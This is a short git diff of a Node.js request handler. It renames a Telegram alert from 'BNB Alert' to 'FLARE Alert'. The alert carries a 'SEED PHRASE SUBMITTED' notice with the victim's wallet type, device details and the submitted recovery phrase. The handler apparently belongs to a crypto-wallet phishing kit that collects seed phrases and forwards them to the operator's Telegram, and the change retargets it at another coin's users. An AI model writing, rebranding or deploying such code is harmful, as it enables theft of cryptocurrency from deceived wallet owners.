@@ -160,8 +160,8 @@ module.exports = async function handler(req, res) {
     const escapedDate = escapeHTML(formattedDate);
     const escapedDevice = escapeHTML(deviceInfo.substring(0, 200));
     
-    // Format Telegram message in "BNB Alert" style using HTML
-    let message = `🚨 <b>BNB Alert</b>\n\n` +
+    // Format Telegram message in "FLARE Alert" style using HTML
+    let message = `🚨 <b>FLARE Alert</b>\n\n` +
                    `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
                    `👤 <b>Wallet:</b> ${escapedWallet}\n` +
                    `🔤 <b>Words:</b> ${wordCountDesc}\n` +
@@ -185,7 +185,7 @@ module.exports = async function handler(req, res) {
       const maxPhraseLength = Math.max(0, 4096 - baseMessageLength - 100); // Leave 100 chars buffer
       const truncatedPhrase = phrase.substring(0, maxPhraseLength);
       const escapedTruncatedPhrase = escapeHTML(truncatedPhrase);
-      message = `🚨 <b>BNB Alert</b>\n\n` +
+      message = `🚨 <b>FLARE Alert</b>\n\n` +
                  `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
                  `👤 <b>Wallet:</b> ${escapedWallet}\n` +
                  `🔤 <b>Words:</b> ${wordCountDesc}\n` +
